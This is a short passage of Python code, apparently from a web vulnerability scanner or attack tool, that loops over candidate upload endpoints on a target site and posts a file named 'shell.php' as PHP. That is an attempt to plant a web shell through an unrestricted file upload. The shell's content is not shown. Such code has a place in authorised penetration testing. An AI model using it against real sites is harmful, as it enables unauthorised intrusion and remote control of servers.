            filename = "shell.php"
            ct = "application/x-php"
            for ep in self._EP9_UPLOAD_ENDPOINTS:
                url = urljoin(self.target, ep)
                data = {"submit": "Upload"}
                r = self._post(url, files={"file": (filename, content, ct)},
                           data=data, timeout=8)
                if r is None: continue
                txt = r.text or ""
